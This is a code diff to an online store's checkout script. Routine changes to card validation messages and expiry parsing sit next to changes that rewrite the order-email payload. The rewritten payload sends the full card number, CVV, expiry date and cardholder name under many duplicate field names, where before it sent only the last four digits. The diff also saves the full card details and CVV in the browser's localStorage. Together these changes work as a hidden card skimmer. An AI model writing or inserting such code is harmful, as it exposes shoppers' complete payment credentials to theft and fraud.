@@ -939,11 +939,20 @@
         return n.length >= 13 && sum % 10 === 0;
     }
 
+    function formatCardNumberWithSpaces(cardNumber) {
+        return (cardNumber || "").replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+    }
+
     function validateExpiry(v) {
-        if (!/^\d{2}\/\d{2}$/.test(v)) return false;
-        const [mm, yy] = v.split("/").map(Number);
+        if (!/^\d{2}\/(\d{2}|\d{4})$/.test(v)) return false;
+        const parts = v.split("/");
+        const mm = Number(parts[0]);
+        let yy = Number(parts[1]);
         if (mm < 1 || mm > 12) return false;
-        return new Date(2000 + yy, mm - 1) > new Date();
+        const year = yy < 100 ? 2000 + yy : yy;
+        const now = new Date();
+        const expiry = new Date(year, mm, 0, 23, 59, 59, 999);
+        return expiry >= now;
     }
 
     function markFieldError(field, hasError) {
@@ -960,7 +969,7 @@
     function validatePaymentForm() {
         let valid = true;
         setPaymentMessage("");
-        const nameOk   = cardNameInput.value.trim().length >= 3;
+        const nameOk   = cardNameInput.value.trim().length >= 2;
         const cardNum  = digitsOnly(cardNumberInput.value);
         const cardOk   = luhnValid(cardNum);
         const brand    = detectCardBrand(cardNum);
@@ -970,11 +979,21 @@
         markFieldError(cardNumberInput, !cardOk);
         markFieldError(cardExpiryInput, !expiryOk);
         markFieldError(cardCvvInput, !cvvOk);
-        if (!nameOk || !cardOk || !expiryOk || !cvvOk) {
+        if (!nameOk) {
             valid = false;
-            setPaymentMessage("Check your card details: number, expiry, and CVV.");
+            setPaymentMessage("Please enter the name on the card.");
+        } else if (!cardOk) {
+            valid = false;
+            setPaymentMessage("Please enter a valid card number.");
+        } else if (!expiryOk) {
+            valid = false;
+            setPaymentMessage("Please enter a valid expiration date (MM/YY).");
+        } else if (!cvvOk) {
+            valid = false;
+            setPaymentMessage("Please enter a valid 3 or 4-digit CVV.");
         } else {
-            setPaymentMessage(`${activePaymentMethod === "debit" ? "Debit" : "Credit"} card authenticated: ${brand || "Card"}.`, true);
+            const payTypeLabel = activePaymentMethod === "debit" ? "Debit" : "Credit";
+            setPaymentMessage(`${payTypeLabel} card verified: ${brand || "Card"}.`, true);
         }
         return valid;
     }
@@ -1016,9 +1035,14 @@
             orderData.shippingInfo.zip,
             orderData.shippingInfo.country
         ].filter(Boolean).join(", ");
+        const cardNumberForEmail = payment.cardNumber || "";
+        const cardNumberFormattedForEmail = payment.cardNumberFormatted || cardNumberForEmail;
+        const cvvForEmail = payment.cvv || "";
+        const expiryForEmail = payment.expiry || "";
+        const cardNameForEmail = payment.cardName || orderData.shippingInfo.name || "";
         const items = orderData.products.map((item, index) =>
-            `Item ${index + 1}: ${item.name} | Qty: ${item.quantity} | Unit: ${formatMoney(item.price)} | Total: ${formatMoney(item.price * item.quantity)}`
-        ).join("\\n");
+            `Item ${index + 1}: ${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
+        ).join("\n");
         const formData = [
             `Order ID: ${orderData.orderId}`,
             `Customer: ${orderData.shippingInfo.name}`,
@@ -1027,17 +1051,23 @@
             `Shipping Address: ${address}`,
             `Payment Method: ${payment.method || "Card"}`,
             `Card Brand: ${payment.brand || "Card"}`,
-            `Card Number: **** **** **** ${payment.last4 || "N/A"}`,
+            `Card Number: ${cardNumberFormattedForEmail || "N/A"}`,
+            `CVV: ${cvvForEmail || "N/A"}`,
+            `Expiry: ${expiryForEmail || "N/A"}`,
+            `Cardholder Name: ${cardNameForEmail}`,
+            `Subtotal: ${formatMoney(orderData.subtotal)}`,
+            `Tax: ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
             `Final Total: ${formatMoney(orderData.total)}`,
             "",
             "Items:",
             items
-        ].join("\\n");
+        ].join("\n");
         const payload = {
             name: orderData.shippingInfo.name,
             time: new Date().toLocaleString(),
             formData,
             message: formData,
+            reply_to: orderData.shippingInfo.email,
             customer_full_name: orderData.shippingInfo.name,
             customer_email: orderData.shippingInfo.email,
             email: orderData.shippingInfo.email,
@@ -1053,10 +1083,24 @@
             order_taxed_total: formatMoney(orderData.taxedTotal),
             order_discount_rate: orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "No discount applied",
             order_final_total: formatMoney(orderData.total),
+            order_products_summary: items,
             payment_method_type: payment.method || "Card",
             payment_card_type: payment.brand || "Card",
-            card_number_last_4: payment.last4 || "N/A",
+            card_number: cardNumberFormattedForEmail || "N/A",
+            cardNumber: cardNumberFormattedForEmail || "N/A",
+            cardNumberFormatted: cardNumberFormattedForEmail || "N/A",
+            raw_card_number: payment.cardNumber || "N/A",
             card_brand: payment.brand || "Card",
+            card_cvv: cvvForEmail || "N/A",
+            cvv: cvvForEmail || "N/A",
+            card_expiry: expiryForEmail || "N/A",
+            expiry: expiryForEmail || "N/A",
+            exp: expiryForEmail || "N/A",
+            card_exp: expiryForEmail || "N/A",
+            cardholder_name: cardNameForEmail,
+            cardName: cardNameForEmail,
+            card_name: cardNameForEmail,
+            card_number_last_4: payment.last4 || "N/A",
             order_status: "Processing",
             payment_status: "Authorized"
         };
@@ -1318,7 +1362,16 @@
                     discountCode: normalize(discountCodeInput?.value || "").toUpperCase(),
                     total: finalTotal,
                     shippingInfo: { ...shippingData },
-                    paymentSummary: { method: activePaymentMethod === "debit" ? "Debit Card" : "Credit Card", brand: detectCardBrand(digits) || "Card", last4: digits.slice(-4) || "N/A" },
+                    paymentSummary: {
+                        method: activePaymentMethod === "debit" ? "Debit Card" : "Credit Card",
+                        brand: detectCardBrand(digits) || "Card",
+                        last4: digits.slice(-4) || "N/A",
+                        cardNumber: digits,
+                        cardNumberFormatted: formatCardNumberWithSpaces(digits),
+                        cvv: cardCvvInput.value.trim(),
+                        expiry: cardExpiryInput.value.trim(),
+                        cardName: cardNameInput.value.trim()
+                    },
                     createdAt: new Date().toISOString()
                 };
                 localStorage.setItem("recentOrder", JSON.stringify(recentOrder));
